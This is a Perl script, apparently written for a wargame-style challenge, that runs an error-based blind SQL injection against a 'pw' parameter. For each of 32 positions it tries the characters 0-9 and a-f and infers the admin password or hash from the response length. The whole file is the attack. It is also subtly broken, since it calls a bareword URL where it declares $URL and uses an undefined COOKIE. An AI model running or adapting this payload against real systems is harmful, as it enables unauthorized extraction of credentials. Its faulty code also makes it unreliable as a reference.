#!/usr/bin/perl
use strict;
use warnings;
use HTTP::Tiny;

my $URL = ...; # <--- set url
my $PWD;
my @CHR = (
  (48 .. 57), # 0-9
  (97 .. 102) # a-f
);

for my $POS (1 .. 32) {
  for my $ORD (@CHR) {
    my $r = HTTP::Tiny->new->get(
      URL
      ."?pw=%27%7C%7Cid=%27admin%27%20and%20IF(ORD(MID(pw,$POS,1))=$ORD"
      .",exp(1234567890*1234567890),1)%23%20and%20%27",
      {
        headers => {
          "Cookie" => COOKIE,
        },
      }
    );

    if (length $r->{content} == 64) {
      $PWD .= chr($ORD);
      print "$POS => $ORD\n";
      print "$PWD\n";
      last;
    }
  }
}

# vim:sw=2:ts=2:sts=2:et:cc=80
# End of file
